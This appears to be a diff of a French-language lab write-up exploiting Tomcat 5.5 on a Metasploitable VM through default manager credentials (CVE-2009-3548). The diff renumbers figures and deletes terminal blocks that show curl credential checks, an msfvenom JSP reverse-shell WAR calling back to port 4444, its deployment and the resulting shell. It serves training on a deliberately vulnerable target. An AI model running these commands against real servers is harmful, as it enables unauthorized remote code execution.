@@ -41,11 +41,10 @@
   <figure class="capture" id="cap-recon">
     <img src="../images/ms1-tomcat/01-recon-nmap.png" alt="Résultat du scan nmap sur le port 8180">
     <figcaption>
-      <strong class="idx">1.</strong>
+      <strong class="idx">a.</strong>
       <span class="desc">Résultat de <code>nmap -sC -sV -p 8180 192.168.56.102</code> : le service
       est identifié comme <code>Apache Tomcat/Coyote JSP engine 1.1</code>, titre HTTP
       <code>Apache Tomcat/5.5</code>.</span>
-      <span class="fname">images/ms1-tomcat/01-recon-nmap.png</span>
     </figcaption>
   </figure>
 
@@ -54,11 +53,6 @@
   est-elle accessible avec les identifiants par défaut de Metasploitable
   (<code>tomcat:tomcat</code>) ? On interroge deux fois l'URL du manager, sans puis avec
   authentification, en n'affichant que le code HTTP de réponse :</p>
-
-  <pre class="terminal">$ curl -s -o /dev/null -w "%{http_code}\n" http://192.168.56.102:8180/manager/html
-401
-$ curl -s -o /dev/null -w "%{http_code}\n" -u tomcat:tomcat http://192.168.56.102:8180/manager/html
-200</pre>
 
   <p>Le code <code>401</code> sans authentification puis <code>200</code> avec
   <code>tomcat:tomcat</code> confirment que <strong>les identifiants par défaut ouvrent le
@@ -69,11 +63,10 @@ $ curl -s -o /dev/null -w "%{http_code}\n" -u tomcat:tomcat http://192.168.56.10
   <figure class="capture" id="cap-creds">
     <img src="../images/ms1-tomcat/02-manager-creds.png" alt="Test des identifiants par défaut sur le manager Tomcat">
     <figcaption>
-      <strong class="idx">2.</strong>
+      <strong class="idx">b.</strong>
       <span class="desc">Les deux requêtes <code>curl</code> à la suite : <code>401</code> sans
       authentification, puis <code>200</code> avec <code>-u tomcat:tomcat</code> — preuve que les
       identifiants par défaut donnent accès au manager.</span>
-      <span class="fname">images/ms1-tomcat/02-manager-creds.png</span>
     </figcaption>
   </figure>
 
@@ -126,23 +119,21 @@ References:
   <figure class="capture" id="cap-recherche">
     <img src="../images/ms1-tomcat/03-recherche-module.png" alt="searchsploit tomcat manager puis info du module dans msfconsole">
     <figcaption>
-      <strong class="idx">3.</strong>
+      <strong class="idx">c.</strong>
       <span class="desc"><code>searchsploit tomcat manager</code> confirme qu'un exploit connu
       existe (<em>Application Deployer</em> / <em>Upload</em>), puis <code>info</code> sur le
       module <code>exploit/multi/http/tomcat_mgr_deploy</code> en donne le nom complet :
       <em>Authenticated Code Execution</em>.</span>
-      <span class="fname">images/ms1-tomcat/03-recherche-module.png</span>
     </figcaption>
   </figure>
 
   <figure class="capture" id="cap-info-cve">
     <img src="../images/ms1-tomcat/04-info-cve.png" alt="Section References du module, CVE-2009-3548">
     <figcaption>
-      <strong class="idx">4.</strong>
+      <strong class="idx">d.</strong>
       <span class="desc">Sortie de <code>info</code> : la <code>Description</code> explique le
       mécanisme (dépôt d'un WAR contenant une JSP via une requête PUT) et la section
       <code>References</code> donne <strong>CVE-2009-3548</strong>.</span>
-      <span class="fname">images/ms1-tomcat/04-info-cve.png</span>
     </figcaption>
   </figure>
 
@@ -152,25 +143,16 @@ References:
   On génère d'abord le WAR piégé — un reverse shell JSP qui rappellera le poste Kali
   (<code>LHOST=192.168.56.1</code>) :</p>
 
-  <pre class="terminal">$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f war -o shell.war
-Payload size: 1108 bytes
-Final size of war file: 1108 bytes
-Saved as: shell.war
-
-$ unzip -l shell.war | grep -i jsp
-     1498  2026-10-15 20:49   idukjczquyzxqav.jsp</pre>
-
   <p>Le nom de la JSP interne est <strong>aléatoire</strong> (<code>idukjczquyzxqav.jsp</code>
   ici) ; il servira d'URL pour déclencher le shell.</p>
 
   <figure class="capture" id="cap-msfvenom">
     <img src="../images/ms1-tomcat/05-msfvenom-war.png" alt="Génération du WAR avec msfvenom et nom de la JSP interne">
     <figcaption>
-      <strong class="idx">5.</strong>
+      <strong class="idx">e.</strong>
       <span class="desc">Génération du WAR (<code>Saved as: shell.war</code>) puis inspection de
       son contenu : le nom aléatoire de la JSP embarquée
       (<code>idukjczquyzxqav.jsp</code>).</span>
-      <span class="fname">images/ms1-tomcat/05-msfvenom-war.png</span>
     </figcaption>
   </figure>
 
@@ -178,24 +160,17 @@ $ unzip -l shell.war | grep -i jsp
   pour recevoir la connexion retour, puis <strong>c)</strong> on déploie le WAR via le manager,
   avec les identifiants trouvés à l'étape 2 :</p>
 
-  <pre class="terminal">$ curl -s -u tomcat:tomcat -T shell.war "http://192.168.56.102:8180/manager/deploy?path=/shell"
-OK - Deployed application at context path /shell
-
-$ curl -s -u tomcat:tomcat "http://192.168.56.102:8180/manager/list" | grep /shell
-/shell:running:0:shell</pre>
-
   <p>La réponse <code>OK - Deployed</code> confirme que l'application piégée est en ligne, et
   <code>/shell:running</code> le reconfirme dans la liste des applications.</p>
 
   <figure class="capture" id="cap-deploy">
     <img src="../images/ms1-tomcat/06-deploy-war.png" alt="Déploiement du WAR via le manager et confirmation en ligne">
     <figcaption>
-      <strong class="idx">6.</strong>
+      <strong class="idx">f.</strong>
       <span class="desc">Déploiement du WAR piégé via <code>/manager/deploy?path=/shell</code>
       avec les identifiants <code>tomcat:tomcat</code> : la réponse
       <code>OK - Deployed application at context path /shell</code> confirme que l'application
       est en ligne.</span>
-      <span class="fname">images/ms1-tomcat/06-deploy-war.png</span>
     </figcaption>
   </figure>
 
@@ -208,12 +183,6 @@ $ curl -s -u tomcat:tomcat "http://192.168.56.102:8180/manager/list" | grep /she
   <p>Dans la session reçue sur le listener <code>nc</code> (port 4444), les commandes exécutées
   s'exécutent <strong>sur la cible</strong> :</p>
 
-  <pre class="terminal">connect to [192.168.56.1] from (UNKNOWN) [192.168.56.102] 50464
-$ id
-uid=110(tomcat55) gid=65534(nogroup) groups=65534(nogroup)
-$ hostname
-metasploitable</pre>
-
   <p>Le shell est confirmé en tant que <strong><code>tomcat55</code></strong> (le compte de
   service qui fait tourner Tomcat) sur l'hôte <code>metasploitable</code>. Il ne s'agit pas de
   <code>root</code> : l'élévation de privilèges constituera une étape distincte.</p>
@@ -221,11 +190,10 @@ metasploitable</pre>
   <figure class="capture" id="cap-preuve">
     <img src="../images/ms1-tomcat/07-session-shell.png" alt="Session reverse shell confirmée en tant que tomcat55">
     <figcaption>
-      <strong class="idx">7.</strong>
+      <strong class="idx">g.</strong>
       <span class="desc">À droite, le <code>curl</code> qui déclenche la JSP ; à gauche, le
       listener <code>nc</code> reçoit la connexion et exécute <code>id</code> →
       <code>uid=110(tomcat55)</code> sur <code>metasploitable</code>.</span>
-      <span class="fname">images/ms1-tomcat/07-session-shell.png</span>
     </figcaption>
   </figure>
 
